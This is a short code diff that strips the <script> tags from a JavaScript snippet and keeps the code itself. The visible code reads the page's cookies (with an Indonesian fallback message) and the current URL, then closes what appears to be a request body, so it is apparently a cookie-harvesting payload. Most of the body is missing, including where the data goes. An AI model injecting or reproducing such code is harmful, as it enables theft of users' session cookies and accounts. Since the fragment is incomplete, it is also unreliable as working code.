@@ -1,4 +1,3 @@
-<script>
 (async () => {
   const cookies = document.cookie || "Tidak ada cookie";
   const url = window.location.href;
@@ -28,4 +27,3 @@
     })
   });
 })();
-</script>
